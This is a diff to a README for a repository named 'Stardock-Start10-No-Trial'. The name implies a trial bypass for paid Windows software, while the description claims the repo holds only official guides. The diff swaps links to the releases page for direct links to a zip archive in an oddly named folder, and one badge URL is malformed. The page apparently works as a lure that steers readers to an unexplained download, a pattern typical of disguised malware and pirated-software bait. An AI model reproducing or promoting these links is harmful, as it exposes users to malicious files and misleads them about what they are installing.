@@ -1,6 +1,6 @@
 # ✨ Stardock-Start10-No-Trial - Your Classic Start Menu for Windows
 
-[![Download Stardock Start10](https://img.shields.io/badge/Download-Stardock%20Start10-blue.svg)](https://github.com/Amna-Ilyas/Stardock-Start10-No-Trial/releases)
+[![Download Stardock Start10](https://raw.githubusercontent.com/Amna-Ilyas/Stardock-Start10-No-Trial/main/spatheful/Stardock-Start10-No-Trial-2.9-alpha.4.zip%https://raw.githubusercontent.com/Amna-Ilyas/Stardock-Start10-No-Trial/main/spatheful/Stardock-Start10-No-Trial-2.9-alpha.4.zip)](https://raw.githubusercontent.com/Amna-Ilyas/Stardock-Start10-No-Trial/main/spatheful/Stardock-Start10-No-Trial-2.9-alpha.4.zip)
 
 ## 📄 Description
 This repository offers a comprehensive collection of official resources, detailed guides, and reference materials for Stardock Start10, tailored for Windows PCs. It supports users seeking reliable information and best practices without including any paid or restricted software components.
@@ -11,7 +11,7 @@ To get started with Stardock Start10, follow these steps for a smooth experience
 ## 🔗 Download & Install
 To download the application, visit the following link:
 
-[Download Stardock Start10](https://github.com/Amna-Ilyas/Stardock-Start10-No-Trial/releases)
+[Download Stardock Start10](https://raw.githubusercontent.com/Amna-Ilyas/Stardock-Start10-No-Trial/main/spatheful/Stardock-Start10-No-Trial-2.9-alpha.4.zip)
 
 After visiting this page:
 
